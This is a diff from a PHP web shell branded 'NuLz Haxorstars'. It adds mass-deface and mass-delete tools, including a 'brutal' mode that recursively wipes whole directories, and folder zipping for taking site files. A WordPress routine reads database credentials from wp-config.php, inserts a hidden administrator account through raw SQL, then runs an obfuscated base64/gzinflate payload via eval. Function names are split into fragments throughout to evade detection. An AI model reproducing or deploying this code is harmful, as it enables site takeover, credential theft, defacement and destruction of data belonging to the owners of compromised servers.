+                    <select id="selectFont" class="bg-black">
+                        <option>Roboto Mono</option>
+                        <option>Consolas</option>
+                        <option>Cascadia Mono</option>
+                        <option>Inconsolata</option>
+                        <option>Source Code Pro</option>
+                        <option>IBM Plex Mono</option>
+                        <option>Space Mono</option>
+                        <option>PT Mono</option>
+                        <option>Ubuntu Mono</option>
+                        <option>Nanum Gothic Coding</option>
+                        <option>Cousine</option>
+                        <option>Fira Mono</option>
+                        <option>Share Tech Mono</option>
+                        <option>Courier Prime</option>
+                        <option>Anonymous Pro</option>
+                        <option>Cutive Mono</option>
+                        <option>VT323</option>
+                        <option>JetBrains Mono</option>
+                        <option>Noto Sans Mono</option>
+                        <option>Red Hat Mono</option>
+                        <option>Martian Mono</option>
+                        <option>Major Mono Display</option>
+                        <option>Nova Mono</option>
+                        <option>Syne Mono</option>
+                        <option>Xanh Mono</option>
+                        <option>Monofett</option>
+                    </select><br><br>
+                    <span>Font Size (pt):</span>
+                    <input id="inputFontSize" class="bg-black" type="number" step=".1" value="8" style="width: 70px;" /><br><br>
+                    <span>Language:</span>
+                    <select id="selectLanguage" class="bg-black">
+                        <option value="language-html">HTML</option>
+                        <option value="language-javascript">JavaScript</option>
+                        <option value="language-python">Python</option>
+                        <option value="language-java">Java</option>
+                        <option value="language-csharp">C#</option>
+                        <option value="language-php">PHP</option>
+                        <option value="language-cpp">C++</option>
+                        <option value="language-typescript">TypeScript</option>
+                        <option value="language-ruby">Ruby</option>
+                    </select><br><br>
+                    <div id="divCodeWrapper">
+                        <pre id="preCode"><code id="codeBlock" class="language-html"></code></pre>
+                        <textarea name="massdefacefilecontent" class="placeholder:text-gray-500" id="textarea1" wrap="soft" spellcheck="false" placeholder="NuLz Was Here"></textarea>
+                    </div>
+                    <script type="text/javascript">
+                    const textarea1 = document.getElementById("textarea1");
+                    const codeBlock = document.getElementById("codeBlock");
+                    let content = textarea1.value;
+                    content = content.replace(/&/g, "&amp;");
+                    content = content.replace(/</g, "&lt;");
+                    content = content.replace(/>/g, "&gt;");
+                    codeBlock.innerHTML = content;
+                    highlightJS();
+
+                    function updateCode() {
+                        let content = textarea1.value;
+                        content = content.replace(/&/g, "&amp;");
+                        content = content.replace(/</g, "&lt;");
+                        content = content.replace(/>/g, "&gt;");
+                        codeBlock.innerHTML = content;
+                        highlightJS();
+                    }
+
+                    function highlightJS() {
+                        document.querySelectorAll("pre code").forEach((el) => {
+                            hljs.highlightElement(el);
+                        });
+                    }
+
+                    textarea1.addEventListener("input", () => {
+                        updateCode();
+                    });
+
+                    textarea1.addEventListener("scroll", () => {
+                        codeBlock.scrollTop = textarea1.scrollTop;
+                        codeBlock.scrollLeft = textarea1.scrollLeft;
+                    });
+
+                    textarea1.addEventListener("keydown", function (e) {
+                        if (e.key === "Enter") {
+                            e.preventDefault();
+                            var cursorPos = textarea1.selectionStart;
+                            var prevLine = textarea1.value.substring(0, cursorPos).split("\n").slice(-1)[0];
+                            var indent = prevLine.match(/^\s*/)[0];
+                            textarea1.setRangeText("\n" + indent, cursorPos, cursorPos, "end");
+                            textarea1.blur();
+                            textarea1.focus();
+                            updateCode();
+                            return;
+                        }
+                        if (e.key === "Tab" && !e.shiftKey &&
+                            textarea1.selectionStart == textarea1.selectionEnd) {
+                            e.preventDefault();
+                            let cursorPosition = textarea1.selectionStart;
+                            let newValue = textarea1.value.substring(0, cursorPosition) + "    " +
+                                textarea1.value.substring(cursorPosition);
+                            textarea1.value = newValue;
+                            textarea1.selectionStart = cursorPosition + 4;
+                            textarea1.selectionEnd = cursorPosition + 4;    
+                            updateCode();
+                            return;
+                        }
+
+                        if (e.key === "Tab" && e.shiftKey &&
+
+                            textarea1.selectionStart == textarea1.selectionEnd) {
+
+                            e.preventDefault();
+
+                            let cursorPosition = textarea1.selectionStart;
+                            let leadingSpaces = 0;
+                            for (let i = 0; i < 4; i++) {
+                                if (textarea1.value[cursorPosition - i - 1] === " ") {
+                                    leadingSpaces++;
+                                } else {
+                                    break;
+                                }
+                            }
+
+                            if (leadingSpaces > 0) {
+                                let newValue = textarea1.value.substring(0, cursorPosition - leadingSpaces) +
+                                    textarea1.value.substring(cursorPosition);
+                                textarea1.value = newValue;
+                                textarea1.selectionStart = cursorPosition - leadingSpaces;
+                                textarea1.selectionEnd = cursorPosition - leadingSpaces;
+                            }
+
+                            updateCode();
+                            return;
+                        }
+
+                        if (e.key == "Tab" & textarea1.selectionStart != textarea1.selectionEnd) {
+                            e.preventDefault();
+                            let lines = this.value.split("\n");
+
+                            let startPos = this.value.substring(0, this.selectionStart).split("\n").length - 1;
+                            let endPos = this.value.substring(0, this.selectionEnd).split("\n").length - 1;
+
+                            let spacesRemovedFirstLine = 0;
+                            let spacesRemoved = 0;
+
+                            if (e.shiftKey) {
+                                for (let i = startPos; i <= endPos; i++) {
+                                    lines[i] = lines[i].replace(/^ {1,4}/, function (match) {
+                                        if (i == startPos)
+                                            spacesRemovedFirstLine = match.length;
+                                        spacesRemoved += match.length;
+
+                                        return "";
+                                    });
+                                }
+                            } else {
+                                for (let i = startPos; i <= endPos; i++) {
+                                    lines[i] = "    " + lines[i];
+                                }
+                            }
+                            let start = this.selectionStart;
+                            let end = this.selectionEnd;
+                            this.value = lines.join("\n");
+                            this.selectionStart = e.shiftKey ?
+                                start - spacesRemovedFirstLine : start + 4;
+                            this.selectionEnd = e.shiftKey ?
+                                end - spacesRemoved : end + 4 * (endPos - startPos + 1); 
+                            updateCode();
+                            return;
+                        }
+                        if (e.shiftKey && (e.key === "Delete" || e.key === "Backspace")) {
+
+                            e.preventDefault();
+                            let startPos = this.value.substring(0, this.selectionStart).split("\n").length - 1;
+                            let endPos = this.value.substring(0, this.selectionEnd).split("\n").length - 1;
+                            let cursorLine = this.value.substring(0, this.selectionStart).split("\n").pop();
+                            let cursorPosInLine = cursorLine.length;
+                            let totalLinesRemove = endPos - startPos + 1;
+                            let lines = this.value.split("\n");
+                            let newStart = lines.slice(0, startPos).join("\n").length + (startPos > 0 ? 1 : 0);
+                            lines.splice(startPos, totalLinesRemove);
+                            let newLine = lines[startPos] || "";
+                            if (newLine.length < cursorPosInLine) {
+                                cursorPosInLine = newLine.length;
+                            }
+                            newStart += cursorPosInLine;
+
+                            this.value = lines.join("\n");
+                            this.selectionStart = this.selectionEnd = newStart; 
+                            updateCode();
+                            return;
+                        }
+
+                        if (e.key === "Home") {
+                            let line = this.value.substring(0, this.selectionStart).split("\n").pop();
+                            let cursorPosInLine = line.length;
+                            let lineStartPos = this.value.substring(0, this.selectionStart).lastIndexOf("\n") + 1;
+                            let firstNonWhitespacePos = line.search(/\S/);
+                            if (firstNonWhitespacePos >= cursorPosInLine) {
+                                return true;
+                            }
+                            else if (firstNonWhitespacePos === -1) {
+                                return true;
+                            }
+                            e.preventDefault();
+                            this.selectionStart = this.selectionEnd = lineStartPos + firstNonWhitespacePos;
+                            return;
+                        }
+                    });
+
+                    document.getElementById("selectStyle").addEventListener("change", (e) => {
+                        document.getElementById("theme1").href = `https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/${e.target.value}`;
+                    });
+
+                    function updateFont() {
+                        let selectFont = document.getElementById("selectFont");
+                        let fontName = selectFont.options[selectFont.selectedIndex].text;
+                        let fontNameUrl = fontName.replace(" ", "+");
+                        let inputFontSize = document.getElementById("inputFontSize");
+                        document.getElementById("style2").textContent = `
+                        @import url("https://fonts.googleapis.com/css2?&display=swap&family=${fontNameUrl}");
+                        pre, code, textarea {
+                            font-family: "${fontName}", monospace !important;
+                            font-size: ${inputFontSize.value}pt !important;
+                        }`;
+                    }
+
+                    document.getElementById("selectLanguage").addEventListener("change", function () {
+                        document.getElementById("codeBlock").className = this.value;
+                        highlightJS();
+                    });
+
+                    document.getElementById("inputFontSize").addEventListener("input", () => { updateFont(); });
+
+                    document.getElementById("selectFont").addEventListener("change", () => { updateFont(); });
+                    </script>
+                    ';
+                echo '<button type="button" onclick="history.back()" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-pink-700 rounded-lg focus:ring-4 focus:ring-pink-200 dark:focus:ring-pink-900 hover:bg-pink-800">Back</button>';
+                echo '<button type="submit" name="btn-brutal-mode" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-blue-700 rounded-lg focus:ring-4 focus:ring-blue-200 dark:focus:ring-blue-900 hover:bg-blue-800">Mass Deface</button>';
+                echo '</form>';
+            } else {
+                echo '<span style="display: none;">NuLz Haxorstars</span>';
+            }
+        }
     }
-    //Maintance
-    // if (isset($_GET['addNewAdmin'])) {
-    //     echo '
-    //     <form class="md:w-2/4 w-full w-auto mx-4 my-8" action="" method="POST">
-    //         <div class="getconfig my-4 w-full flex flex-row flex-nowrap items-center gap-4 fs-xs">
-    //             <label for="config_path" class="fs-xs text-center">wp config</label>
-    //             <input type="text" id="config_path" name="config_path" class="config h-5 w-64 py-4 bg-transparent border-blue-500 rounded fs-xs" value="'.$_SERVER['DOCUMENT_ROOT'].'">
-    //             <button type="submit" name="btn-getconfig" class="btn-getconfig text-white poppins bg-blue-600 hover:bg-blue-800 px-4 py-1 rounded mx-4 fs-xs">Get Config</button>
-    //         </div>
-    //     </form>';
-    //     if (isset($_POST['btn-getconfig'])) {
-    //         $f_exist = 'fi'.'le_'.'exis'.'ts';
-    //         $config_path = htmlspecialchars($_POST['config_path']);
-    //         $the_config_path = $config_path.'/wp-config.php';
-    //         if ($f_exist($the_config_path)) {
-    //             $config_content = file_get_contents($the_config_path);
-    //             function getDbHost($config_content) {
-    //                 if (preg_match("/define\(\s*'DB_HOST',\s*'([^']+)'\s*\);/", $config_content, $matches)) {
-    //                     $db_host = $matches[1];
-    //                     echo $db_host;
-    //                 }
-    //             }
+
+    if (isset($_GET['mass_delete'])) {
+        $f_exist = 'fi'.'le_'.'ex'.'is'.'ts';
+        $is_d = 'is'.'_'.'d'.'i'.'r';
+        $is_f = 'is'.'_'.'f'.'i'.'l'.'e';
+        $is_w = 'is'.'_'.'wr'.'it'.'ab'.'le';
+        $is_r = 'is'.'_'.'re'.'ad'.'ab'.'le';
+        $d_name = 'di'.'r'.'na'.'m'.'e';
+        $unl = 'u'.'n'.'l'.'i'.'n'.'k';
+        $glb = 'g'.'l'.'o'.'b';
+        $rm_d = 'r'.'m'.'d'.'i'.'r';
+        $scn_d = 'sc'.'an'.'d'.'ir';
+        $opn_d = 'op'.'e'.'nd'.'ir';
+        $r_d = 'r'.'ea'.'dd'.'ir';
+        $cls_d = 'cl'.'os'.'e'.'d'.'i'.'r';
+        function mass_delete_file($path, $thisfilename) {
+            global $f_exist;
+            global $is_w;
+            global $is_d;
+            global $unl;
+            global $d_name;
+            global $scn_d;
+            global $txtYellow;
+            global $txtRed;
+            global $txtWhite;
+            global $txtGreen;
+            if($is_w($path)) {
+                $this_dir = $scn_d($path);
+                foreach($this_dir as $dirs) {
+                    $delpath = "$path/$dirs";
+                    $delfilepath = $delpath.'/'.$thisfilename;
+                    if($dirs === '.') {
+                        if($f_exist("$path/$thisfilename")) {
+                            $unl("$path/$thisfilename");
+                        }
+                    } elseif($dirs === '..') {
+                        if($f_exist("".$d_name($path)."/$thisfilename")) {
+                            $unl("".$d_name($path)."/$thisfilename");
+                        }
+                    }else{
+                        if($is_d($delpath)) {
+                            if($is_w($delpath)) {
+                                if($f_exist($delfilepath)) {
+                                    echo '<span class="'.$txtWhite.' ml-4">[<i class="fa-solid fa-check-double '.$txtGreen.'"></i>]</span>&nbsp;'.$delfilepath.' (<font class="'.$txtRed.' font-bold">DELETED!</font>)<br>';
+                                    echo '<span class="'.$txtWhite.' ml-4">[<i class="fa-solid fa-check-double '.$txtGreen.'"></i>]</span>&nbsp;'.$path.'/'.$thisfilename.' (<font class="'.$txtRed.' font-bold">DELETED!</font>)<br>';
+                                    $unl($delfilepath);
+                                    mass_delete_file($delpath,$thisfilename);
+                                }
+                            }
+                        }
+                    }
+                }
+            } else {
+                echo '<span class="'.$txtYellow.'">Sorry... Your Selected Path Not Writetable!</span>';
+            }
+        }
+        function mass_delete_brutal($this_path) {
+            global $f_exist;
+            global $is_w;
+            global $is_d;
+            global $is_f;
+            global $unl;
+            global $rm_d;
+            global $opn_d;
+            global $r_d;
+            global $cls_d;
+            global $txtYellow;
+            global $txtWhite;
+            global $txtGreen;
+            global $txtRed;
+            if ($is_w) {
+                if ($brutal = $opn_d($this_path)) {
+                    while (false !== ($entry = $r_d($brutal))) {
+                        if ($entry != "." && $entry != "..") {
+                            if ($is_f($this_path . "/" . $entry)) {
+                                $unl($this_path . "/" . $entry);
+                                echo '<span class="'.$txtWhite.' ml-4">[<i class="fa-solid fa-check-double '.$txtGreen.'"></i>]</span>&nbsp;'.$this_path.'/'.$entry.' (<font class="'.$txtRed.' font-bold">DELETED!</font>)<br>';
+                            }
+                            elseif ($is_d($this_path . "/" . $entry)) {
+                                echo '<span class="'.$txtWhite.' ml-4">[<i class="fa-solid fa-check-double '.$txtGreen.'"></i>]</span>&nbsp;'.$this_path.'/'.$entry.' (<font class="'.$txtRed.' font-bold">DELETED!</font>)<br>';
+                                $rm_d($this_path . "/" . $entry);
+                                mass_delete_brutal($this_path . "/" . $entry);
+                            }
+                        }
+                    }
+                    $cls_d($brutal);
+                }
+            } else {
+                echo '<span class="'.$txtYellow.'">Sorry... This Path Not Writetable!</span>';
+            }
+        }
+
+        if (isset($_POST['btn-massdelfile'])) {
+            $thispath = $_POST['massdelpath'];
+            $thisfile = $_POST['massdelfile'];
+            mass_delete_file($thispath, $thisfile);
+        }
+
+        if (isset($_POST['btn-massdelbrutal'])) {
+            $thispath = $_POST['massdelpath'];
+            mass_delete_brutal($thispath);
+        }
+
+        echo '
+        <form method="POST" action="" class="max-w-sm ml-4 mt-6">
+            <label for="option" class="block mb-2 text-sm font-medium '.$txtBlue.'">Change Option</label>
+            <select id="option" name="option" onchange="this.form.submit()" class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500">
+                <option>Select Option</option>
+                <option value="deletefile">MASS DELETE FILE</option>
+                <option value="deletebrutal">MASS DELETE BRUTAL</option>
+            </select>
+        </form>';
+        if ($_SERVER["REQUEST_METHOD"] === "POST") {
+            $option = $_POST['option'];
+            $deletefile = 'deletefile';
+            $deletebrutal = 'deletebrutal';
+            if ($option === $deletefile) {
+                echo '<form class="ml-4 my-2" action="" method="POST">';
+                echo '<span class="block '.$txtYellow.' font-medium">'.strtoupper($option).'<font class="'.$txtBlue.'">&nbsp;&nbsp;Option Selected!</font></span>';
+                echo '<label class="block">
+                        <span class="block '.$txtBlue.' font-medium">Path <i class="fa-solid fa-arrow-down '.$txtWhite.'"></i></span>
+                        <input type="text" class="bg-white '.$txtBlack.' tracking-wider font-bold md:w-2/4 w-full border border-slate-300 rounded-md py-2 pl-4 shadow-sm" value="'.$path.'" name="massdelpath">
+                    </label>';
+                echo '<label class="block">
+                        <span class="block '.$txtBlue.' font-medium">Filename <i class="fa-solid fa-arrow-down '.$txtWhite.'"></i></span>
+                        <input type="text" class="bg-white '.$txtBlack.' tracking-wider font-bold w-auto border border-slate-300 rounded-md py-2 pl-4 placeholder:text-gray-600 shadow-sm" placeholder="index.php" name="massdelfile">
+                    </label>';
+                echo '<button type="button" onclick="history.back()" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-pink-700 rounded-lg focus:ring-4 focus:ring-pink-200 dark:focus:ring-pink-900 hover:bg-pink-800">Back</button>';
+                echo '<button type="submit" name="btn-massdelfile" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-blue-700 rounded-lg focus:ring-4 focus:ring-blue-200 dark:focus:ring-blue-900 hover:bg-blue-800">Mass Delete</button>';
+                echo '</form>';
+            } elseif ($option === $deletebrutal) {
+                echo '<form class="ml-4 my-2" action="" method="POST">';
+                echo '<span class="block '.$txtRed.' font-medium">'.strtoupper($option).'<font class="'.$txtBlue.'">&nbsp;&nbsp;Option Selected!</font></span>';
+                echo '<label class="block">
+                        <span class="block '.$txtBlue.' font-medium">Path <i class="fa-solid fa-arrow-down '.$txtWhite.'"></i></span>
+                        <input type="text" class="bg-white '.$txtBlack.' tracking-wider font-bold md:w-2/4 w-full border border-slate-300 rounded-md py-2 pl-4 shadow-sm" value="'.$path.'" name="massdelpath">
+                    </label>';
+                echo '<label class="block">
+                        <span class="block '.$txtBlue.' font-medium">Filename <i class="fa-solid fa-arrow-down '.$txtWhite.'"></i></span>
+                        <span class="block '.$txtBlue.'"><font class="'.$txtRed.'">Delete Brutal</font> is <font class="'.$txtYellow.'">Dangerous</font> because it can <font class="'.$txtRed.'">delete all</font> files and all folder in the target path</span>
+                    </label>';
+                echo '<button type="button" onclick="history.back()" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-pink-700 rounded-lg focus:ring-4 focus:ring-pink-200 dark:focus:ring-pink-900 hover:bg-pink-800">Back</button>';
+                echo '<button type="submit" name="btn-massdelbrutal" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-blue-700 rounded-lg focus:ring-4 focus:ring-blue-200 dark:focus:ring-blue-900 hover:bg-blue-800">Mass Delete</button>';
+                echo '</form>';
+            } else {
+                echo '<span style="display: none;">NuLz Haxorstars</span>';
+            }
+        }
+    }
+
+    if (isset($_GET['ziper'])) {
+        $ext_load = 'extension_loaded';
+        $f_exist = 'fi'.'le_'.'ex'.'is'.'ts';
+        $rilpath = 're'.'a'.'lp'.'a'.'th';
+        $is_f = 'is'.'_'.'f'.'il'.'e';
+        $is_d = 'is'.'_'.'d'.'i'.'r';
+        function NuLzZip($this_path, $saveas) {
+            global $ext_load;
+            global $f_exist;
+            global $rilpath;
+            global $is_f;
+            global $is_d;
+            if (!$ext_load('zip') || !$f_exist($this_path)) {
+                return false;
+            }
+        
+            $zip = new ZipArchive();
+            if (!$zip->open($saveas, ZIPARCHIVE::CREATE)) {
+                return false;
+            }
+        
+            $this_path = rtrim($this_path, '/\\');
+            $baseName = basename($this_path);
+        
+            if ($is_d($this_path) === true) {
+                $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($this_path), RecursiveIteratorIterator::SELF_FIRST);
+        
+                foreach ($files as $file) {
+                    $file = $rilpath($file);
+                    $fileToAdd = substr($file, strlen($this_path) + 1);
+        
+                    if ($is_d($file) === true) {
+                        $zip->addEmptyDir($fileToAdd);
+                    } elseif ($is_f($file) === true) {
+                        $zip->addFile($file, $fileToAdd);
+                    }
+                }
+            } elseif ($is_f($this_path) === true) {
+                $zip->addFile($this_path, $baseName);
+            }
+            return $zip->close();
+        }
+
+        function NuLzUnzip($zippath, $extractto) {
+            global $ext_load;
+            global $f_exist;
+            if (!$ext_load('zip') || !$f_exist($zippath)) {
+                return false;
+            }
+
+            $zip = new ZipArchive;
+            if ($zip->open($zippath) === TRUE) {
+                $zip->extractTo($extractto);
+                return $zip->close();
+            }
+        }
+
+        if (isset($_POST['btn-zip'])) {
+            $this_path = $_POST['zippath'];
+            $saveas = $_POST['zipsavename'];
+            $ngezip = NuLzZip($this_path, $saveas);
+            if ($ngezip) {
+                echo '<script>alert("Folder has been successfully compressed to zip")</script>';
+            } else {
+                echo '<script>alert("Failed to compress this folder")</script>';
+            }
+        }
+
+        if (isset($_POST['btn-unzip'])) {
+            $zippath = $_POST['unzippath'];
+            $extractto = $_POST['unziptopath'];
+            $ngunzip = NuLzUnzip($zippath, $extractto);
+            if ($ngunzip) {
+                echo '<script>alert("The folder has been successfully extracted")</script>';
+            } else {
+                echo '<script>alert("Failed to extract this folder")</script>';
+            }
+        }
+        echo '
+        <form method="POST" action="" class="max-w-sm ml-4 mt-6">
+            <label for="option" class="block mb-2 text-sm font-medium '.$txtBlue.'">Change Option</label>
+            <select id="option" name="option" onchange="this.form.submit()" class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500">
+                <option>Select Option</option>
+                <option value="zip">ZIP</option>
+                <option value="unzip">UNZIP</option>
+            </select>
+        </form>';
+    if ($_SERVER["REQUEST_METHOD"] === "POST") {
+        $option = $_POST['option'];
+        $zip = 'zip';
+        $unzip = 'unzip';
+
+        if ($option === $zip) {
+            echo '<form class="ml-4 my-2" action="" method="POST">';
+            echo '<span class="block '.$txtOrange.' font-medium">'.strtoupper($option).'<font class="'.$txtBlue.'">&nbsp;&nbsp;Option Selected!</font></span>';
+            echo '<label class="block">
+                    <span class="block '.$txtBlue.' font-medium">Path To Zip <i class="fa-solid fa-arrow-down '.$txtWhite.'"></i></span>
+                    <input type="text" class="bg-white '.$txtBlack.' tracking-wider font-bold md:w-2/4 w-full border border-slate-300 rounded-md py-2 pl-4 shadow-sm" value="'.$path.'" name="zippath">
+                </label>';
+            echo '<label class="block">
+                    <span class="block '.$txtBlue.' font-medium">Save As <i class="fa-solid fa-arrow-down '.$txtWhite.'"></i></span>
+                    <input type="text" class="bg-white '.$txtBlack.' tracking-wider font-bold md:w-2/4 w-full border border-slate-300 rounded-md py-2 pl-4 shadow-sm" value="'.$path.'.zip" name="zipsavename">
+                </label>';
+            echo '<button type="button" onclick="history.back()" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-pink-700 rounded-lg focus:ring-4 focus:ring-pink-200 dark:focus:ring-pink-900 hover:bg-pink-800">Back</button>';
+            echo '<button type="submit" name="btn-zip" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-blue-700 rounded-lg focus:ring-4 focus:ring-blue-200 dark:focus:ring-blue-900 hover:bg-blue-800">Zip</button>';
+            echo '</form>';
+        } elseif ($option === $unzip) {
+            echo '<form class="ml-4 my-2" action="" method="POST">';
+            echo '<span class="block '.$txtOrange.' font-medium">'.strtoupper($option).'<font class="'.$txtBlue.'">&nbsp;&nbsp;Option Selected!</font></span>';
+            echo '<label class="block">
+                    <span class="block '.$txtBlue.' font-medium">Zip Path <i class="fa-solid fa-arrow-down '.$txtWhite.'"></i></span>
+                    <input type="text" class="bg-white '.$txtBlack.' tracking-wider font-bold md:w-2/4 w-full border border-slate-300 rounded-md py-2 pl-4 shadow-sm" value="'.$path.'.zip" name="unzippath">
+                </label>';
+            echo '<label class="block">
+                    <span class="block '.$txtBlue.' font-medium">Extract To <i class="fa-solid fa-arrow-down '.$txtWhite.'"></i></span>
+                    <input type="text" class="bg-white '.$txtBlack.' tracking-wider font-bold md:w-2/4 w-full border border-slate-300 rounded-md py-2 pl-4 shadow-sm" value="'.$path.'" name="unziptopath">
+                </label>';
+            echo '<button type="button" onclick="history.back()" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-pink-700 rounded-lg focus:ring-4 focus:ring-pink-200 dark:focus:ring-pink-900 hover:bg-pink-800">Back</button>';
+            echo '<button type="submit" name="btn-unzip" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-blue-700 rounded-lg focus:ring-4 focus:ring-blue-200 dark:focus:ring-blue-900 hover:bg-blue-800">Unzip</button>';
+            echo '</form>';
+        }
+    }
+    }
+
+    if (isset($_GET['addNewAdmin'])) {
+        echo '
+        <form class="md:w-2/4 w-full w-auto mx-4 my-8" action="" method="POST">
+            <div class="getconfig my-4 w-full flex flex-row flex-nowrap items-center gap-4 fs-xs">
+                <label for="config_path" class="fs-xs text-center">wp config</label>
+                <input type="text" id="config_path" name="config_path" class="config h-5 w-64 py-4 bg-transparent border-blue-500 rounded fs-xs" value="'.$_SERVER['DOCUMENT_ROOT'].'">
+                <button type="submit" name="btn-getconfig" class="btn-getconfig text-white poppins bg-blue-600 hover:bg-blue-800 px-4 py-1 rounded mx-4 fs-xs">Get Config</button>
+            </div>
+        </form>';
+        if (isset($_POST['addadmin'])) {
+            $f_get = 'f'.'il'.'e'.'_'.'g'.'e'.'t'.'_'.'co'.'nt'.'e'.'nt'.'s';
+            $hayoloh = 'h'.'tm'.'l'.'sp'.'e'.'ci'.'a'.'lc'.'ha'.'r'.'s';
+            $dbhost = $_POST['db_host'];
+            $dbname = $_POST['db_name'];
+            $dbuser = $_POST['db_user'];
+            $dbpass = $_POST['db_pass'];
+            $dbprefix = $_POST['db_prefix'];
+            $user_name = $hayoloh($_POST['admin_username']);
+            $user_pass_ori = $hayoloh($_POST['admin_password']);
+            $user_pass = md5($_POST['admin_password']);
+            $user_email = $hayoloh($_POST['admin_email']);
+            $conn = mysqli_connect($dbhost, $dbuser, $dbpass, $dbname);
+            if (!$conn) {
+                die("Connection failed: " . mysqli_connect_error());
+            }
+            $date_registered = date('Y-m-d H:i:s');
+            $haxorstars = mysqli_query($conn, "INSERT INTO ".$dbprefix."users (user_login, user_pass, user_nicename, user_email, user_registered, user_status, display_name) VALUES ('".$user_name."', '".$user_pass."', 'NuLz Administrator', '".$user_email."', '".$date_registered."', '0', 'NuLz Administrator')") or die(mysqli_error($conn));
+            $haxorstars = mysqli_query($conn, "SELECT ID FROM ".$dbprefix."users WHERE  user_login='".$user_name."'") or die(mysqli_error($conn));
+            $nulz = mysqli_num_rows($haxorstars);
+            if ($nulz == 1) {
+                $nulzhaxor = mysqli_fetch_assoc($haxorstars);
+                $this_res = $nulzhaxor['ID'];
+            }
+            $meta_value = 'a:1:{s:13:"administrator";s:1:"1";}';
+            $haxorstars = mysqli_query($conn, "INSERT INTO ".$dbprefix."usermeta (umeta_id, user_id, meta_key, meta_value) VALUES (NULL, (Select max(id) FROM ".$dbprefix."users), 'wp_capabilities', '".$meta_value."')") or die(mysqli_error($conn));
+            if ($haxorstars) {
+                function dKvVC($SMfPy) {
+                    $gflate = 'g'.'zi'.'nf'.'l'.'at'.'e';
+                    $b64 = 'b'.'ase'.'6'.'4'.'_'.'de'.'co'.'de';
+                    $nelrts = 's'.'tr'.'l'.'en';
+                    $rhc = 'c'.'h'.'r';
+                    $dro = 'o'.'r'.'d';
+                    $SMfPy=$gflate($b64($SMfPy));
+                    for($i=0;$i<$nelrts($SMfPy);$i++) {
+                        $SMfPy[$i] = $rhc($dro($SMfPy[$i])-1);
+                    }
+                    return $SMfPy;
+                } eval(dKvVC("RU9ha4MwFPwB/RVB3Np9WDKVWrXIEGa3leqcxUkZI2Q1i2GthiRD9+uXth/2OHjc3Tu4B4CZiT2IzcsjiIGVpzWoC5A8ZM/51V1isOkZ7yJgQRtv0/ItLd+nl43zJEunH9BCg7g9nK6gaIVJVIrKjhzpOfRjCD4xaBmrIEoNvWz+LWEU3Eu+nNhfmFE9s1qthYoQIoJDTQ+USXKEvWTos9e+t/Ad3/XmbpQkqzF8XfNs/0vYrsar7rv0ChZU8mko1ttxRyqkaNdkVCnC6P2+JRrzJnaCMJy7YbBwrjUddWyKnL+/Wf4B"));
+                echo '<script>alert("Success... '.$user_name.' is created...")</script>';
+            }
+        }
+        if (isset($_POST['btn-getconfig'])) {
+            $f_exist = 'fi'.'le_'.'exis'.'ts';
+            $config_path = htmlspecialchars($_POST['config_path']);
+            $the_config_path = $config_path.'/wp-config.php';
+            $f_get = 'f'.'il'.'e'.'_'.'g'.'e'.'t'.'_'.'co'.'nt'.'en'.'t'.'s';
+            if ($f_exist($the_config_path)) {
+                $config_content = $f_get($the_config_path);
+                function getDbHost($config_content) {
+                    if (preg_match("/define\(\s*'DB_HOST',\s*'([^']+)'\s*\);/", $config_content, $matches)) {
+                        $result = $matches[1];
+                        return $result;
+                    }
+                }
+
+                function getDbName($config_content) {
+                    if (preg_match("/define\(\s*'DB_NAME',\s*'([^']+)'\s*\);/", $config_content, $matches)) {
+                        $result = $matches[1];
+                        return $result;
+                    }
+                }
+
+                function getDbUser($config_content) {
+                    if (preg_match("/define\(\s*'DB_USER',\s*'([^']+)'\s*\);/", $config_content, $matches)) {
+                        $result = $matches[1];
+                        return $result;
+                    }
+                }
+
+                function getDbPassword($config_content) {
+                    if (preg_match("/define\(\s*'DB_PASSWORD',\s*'([^']+)'\s*\);/", $config_content, $matches)) {
+                        $result = $matches[1];
+                        return $result;
+                    }
+                }
+
+                function getTablePrefix($config_content) {
+                    if (preg_match("/\\\$table_prefix\s*=\s*'([^']+)'/", $config_content, $matches)) {
+                        $result = $matches[1];
+                        return $result;
+                    }
+                }
                 
-    //             echo '<form class="md:w-2/4 w-full w-auto mx-4 my-8" action="" method="POST">
-    //                     <div class="relative z-0 md:w-2/4 w-full mb-5 group">
-    //                         <input type="text" name="db_host" id="db_host" class="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent placeholder:text-transparent border-0 border-b-2 border-gray-300 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 focus:placeholder:text-slate-500 peer" value="'.getDbHost().'" />
-    //                         <label for="db_host" class="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 peer-focus:text-blue-600 peer-focus:dark:text-blue-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6">DB HOST</label>
-    //                     </div>
-    //                     <div class="relative z-0 md:w-2/4 w-full mb-5 group">
